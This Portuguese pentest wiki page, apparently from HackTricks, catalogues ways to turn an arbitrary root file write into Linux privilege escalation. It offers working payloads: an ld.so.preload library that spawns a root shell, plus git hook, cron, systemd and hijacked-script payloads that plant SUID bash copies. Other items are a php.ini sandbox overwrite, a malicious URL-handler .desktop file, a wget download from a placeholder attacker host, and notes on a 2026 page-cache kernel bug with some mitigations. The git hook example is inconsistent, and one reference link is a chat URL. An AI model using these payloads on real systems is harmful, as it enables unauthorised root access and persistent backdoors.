# Escrita Arbitrária de Arquivo como Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Este arquivo se comporta como a variável de ambiente **`LD_PRELOAD`**, mas também funciona em **binários SUID**.\
Se você puder criá-lo ou modificá-lo, basta adicionar um **caminho para uma biblioteca que será carregada** com cada binário executado.

Por exemplo: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) são **scripts** que são **executed** em vários **events** em um repositório git, como quando um commit é criado, um merge... Então, se um **script ou user privilegiado** está executando essas ações com frequência e é possível **escrever** na pasta `.git`, isso pode ser usado para **privesc**.

Por exemplo, é possível **gerar um script** em um repositório git em `.git/hooks` para que ele seja sempre executado quando um novo commit é criado:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

Se você puder **escrever arquivos relacionados ao cron que o root executa**, normalmente consegue executar código da próxima vez que o job rodar. Alvos interessantes incluem:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- O próprio crontab do root em `/var/spool/cron/` ou `/var/spool/cron/crontabs/`
- `systemd` timers e os serviços que eles acionam

Quick checks:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Caminhos típicos de abuso:

- **Append um novo root cron job** em `/etc/crontab` ou em um arquivo em `/etc/cron.d/`
- **Substitua um script** já executado por `run-parts`
- **Backdoor de um timer target existente** modificando o script ou binário que ele inicia

Exemplo mínimo de payload de cron:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Se você só pode escrever dentro de um diretório cron usado por `run-parts`, então coloque um arquivo executável lá em vez disso:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notas:

- `run-parts` geralmente ignora nomes de arquivo contendo pontos, então prefira nomes como `backup` em vez de `backup.sh`.
- Algumas distros usam `anacron` ou timers do `systemd` em vez do cron clássico, mas a ideia de abuso é a mesma: **modificar o que root executará depois**.

### Service & Socket files

Se você conseguir escrever arquivos de unidade do **`systemd`** ou arquivos referenciados por eles, talvez consiga obter execução de código como root ao recarregar e reiniciar a unidade, ou ao esperar que o caminho de ativação do service/socket seja acionado.

Alvos interessantes incluem:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides em `/etc/systemd/system/<unit>.d/*.conf`
- Service scripts/binaries referenciados por `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Caminhos `EnvironmentFile=` graváveis carregados por um service root

Quick checks:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Caminhos comuns de abuso:

- **Sobrescrever `ExecStart=`** em uma unit de serviço de propriedade de root que você pode modificar
- **Adicionar um drop-in override** com um `ExecStart=` malicioso e limpar o antigo primeiro
- **Inserir backdoor no script/binário** já referenciado pela unit
- **Hijack de um serviço ativado por socket** modificando o arquivo `.service` correspondente que inicia quando o socket recebe uma conexão

Exemplo de override malicioso:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Fluxo típico de ativação:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Se você não pode reiniciar serviços por conta própria, mas pode editar uma unit ativada por socket, talvez você só precise **aguardar uma conexão de cliente** para disparar a execução do serviço com backdoor como root.

### Substitua um `php.ini` restritivo usado por um PHP sandbox privilegiado

Alguns daemons personalizados validam PHP fornecido pelo usuário executando `php` com um **`php.ini` restritivo** (por exemplo, `disable_functions=exec,system,...`). Se o código em sandbox ainda tiver **qualquer primitive de escrita** (como `file_put_contents`) e você conseguir alcançar o **caminho exato do `php.ini`** usado pelo daemon, você pode **substituir essa configuração** para remover as restrições e então enviar um segundo payload que rode com privilégios elevados.

Fluxo típico:

1. O primeiro payload sobrescreve a configuração do sandbox.
2. O segundo payload executa código agora que as funções perigosas foram reativadas.

Exemplo mínimo (substitua o caminho usado pelo daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Se o daemon for executado como root (ou validar caminhos pertencentes a root), a segunda execução produz um contexto de root. Isso é, essencialmente, **privilege escalation via config overwrite** quando o runtime sandboxed ainda consegue escrever arquivos.

### binfmt_misc

O arquivo localizado em `/proc/sys/fs/binfmt_misc` indica qual binary deve executar quais tipos de arquivos. TODO: verificar os requisitos para abusar disso para executar uma rev shell quando um tipo de arquivo comum é aberto.

### Overwrite schema handlers (like http: or https:)

Um atacante com permissões de escrita nos diretórios de configuração da vítima pode facilmente substituir ou criar arquivos que alteram o comportamento do sistema, resultando em execução de código não intencional. Ao modificar o arquivo `$HOME/.config/mimeapps.list` para apontar os manipuladores de URL HTTP e HTTPS para um arquivo malicioso (por exemplo, definindo `x-scheme-handler/http=evil.desktop`), o atacante garante que **clicar em qualquer link http ou https aciona o code especificado nesse arquivo `evil.desktop`**. Por exemplo, depois de colocar o seguinte code malicioso em `evil.desktop` em `$HOME/.local/share/applications`, qualquer clique em URL externo executa o comando embutido:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Para mais informações, confira [**este post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) onde foi usado para explorar uma vulnerabilidade real.

### Root executando scripts/binaries graváveis pelo usuário

Se um workflow privilegiado executa algo como `/bin/sh /home/username/.../script` (ou qualquer binary dentro de um diretório pertencente a um usuário sem privilégios), você pode hijacká-lo:

- **Detectar a execução:** monitore processos com [pspy](https://github.com/DominicBreuker/pspy) para capturar root invocando paths controlados pelo usuário:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirmar permissão de escrita:** certifique-se de que tanto o arquivo alvo quanto seu diretório sejam de sua propriedade/graváveis pelo seu usuário.
- **Sequestrar o alvo:** faça backup do binário/script original e coloque um payload que crie um shell SUID (ou qualquer outra ação de root), depois restaure as permissões:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Dispare a ação privilegiada** (por exemplo, pressionando um botão da UI que inicia o helper). Quando o root reexecutar o path sequestrado, capture o shell escalado com `./rootshell -p`.

### Modificação de arquivo apenas no page-cache de binários privilegiados

Alguns bugs de kernel não modificam o arquivo **no disco**. Em vez disso, eles permitem modificar apenas a cópia no **page cache** de um arquivo legível. Se você conseguir mirar em um binário **setuid** ou executado por **root**, a próxima execução pode rodar bytes controlados pelo atacante a partir da memória e elevar privilégios, mesmo que o hash do arquivo no disco permaneça inalterado.

Isso é útil de pensar como uma **primitiva de escrita em arquivo apenas em runtime**:

- **O disco permanece limpo**: o inode e os bytes no disco não mudam
- **A memória fica suja**: processos que leem/executam a página em cache recebem o conteúdo modificado pelo atacante
- **O efeito é temporário**: a mudança desaparece após reboot ou eviction do cache

Essa primitiva fica entre a clássica **arbitrary file write** e bugs antigos de abuso de **page cache** como Dirty COW / Dirty Pipe:

- Dirty COW dependia de uma race
- Dirty Pipe tinha restrições de posição de escrita
- Uma primitiva apenas de page-cache pode ser mais confiável se o caminho vulnerável fizer writes diretos em páginas cacheadas com file backing

#### Fluxo genérico de privesc

1. Obtenha uma primitiva de kernel que possa escrever em **páginas do page cache com file backing**
2. Use-a contra um **binário privilegiado legível** ou outro arquivo executado por root
3. Dispare a execução **antes** que a página seja expulsa do cache
4. Obtenha code execution como root enquanto o arquivo no disco ainda parece inalterado

Targets típicos de alto valor:

- binários **setuid-root**
- helpers iniciados por **root services**
- binários com execução comum em **containers que compartilham o kernel/page cache do host**

#### Exemplo de caminho com AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) é um bom exemplo dessa classe. O caminho vulnerável ficava na API de userspace de crypto do Linux (`AF_ALG` / `algif_aead`):

- `splice()` pode mover referências a páginas do page cache de um arquivo legível para o scatterlist TX da crypto
- o caminho de decrypt in-place do `algif_aead` reutilizava buffers de origem e destino
- `authencesn` então escrevia na região de tag de destino
- quando essa região ainda referenciava páginas spliced com file backing, a escrita caía no **page cache do arquivo alvo**

Então a técnica interessante não é a CVE em si, mas o padrão:

- **alimentar páginas do cache com file backing em um subsistema do kernel**
- fazer o subsistema **tratá-las como saída gravável**
- disparar um overwrite pequeno e controlado na memória

O PoC público usava writes repetidos de **4 bytes** para patchar `/usr/bin/su` em memória e então executá-lo.

#### Exposição e hunting

Se você suspeitar dessa classe de bug, não confie apenas em verificações de integridade em disco. Também verifique:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` pode ser carregável/descarregável como um módulo
- `CONFIG_CRYPTO_USER_API_AEAD=y`: a interface está integrada ao kernel
- binários setuid são bons alvos porque um patch apenas de page-cache pode ser suficiente para transformar um foothold local em root

#### Redução de attack-surface para o caminho `algif_aead`

Se a interface vulnerável for fornecida por um módulo carregável:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Se estiver compilado no kernel, alguns disclosures relataram bloquear o caminho de init com:
```bash
initcall_blacklist=algif_aead_init
```
Esse tipo de mitigação também vale a pena lembrar para outros LPEs de kernel: se a exploração depende de uma interface opcional específica, desabilitar ou colocar essa interface na blacklist pode quebrar o caminho de exploração mesmo antes de uma atualização completa do kernel estar disponível.

## References

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [Openwall oss-security disclosure for CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [Linux stable fix: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [Copy Fail advisory](https://copy.fail/)
- [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)

{{#include ../../banners/hacktricks-training.md}}
